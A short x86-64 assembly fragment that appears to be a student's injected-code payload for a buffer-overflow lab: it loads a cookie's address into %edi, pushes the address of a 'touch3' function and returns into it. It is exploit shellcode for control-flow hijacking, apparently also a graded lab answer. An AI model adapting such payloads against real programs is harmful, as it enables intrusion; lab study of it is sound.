# Assembly code needed to change register values as well as return addresses
xor 	%edi, %edi			# set edi to 0
add 	$0x55672CB8, %edi	# insert location of cookie value into edi
pushq 	$0x401a9d			# push addr. of touch3 to stack for return
retq 						# return to the address just pushed (touch3)
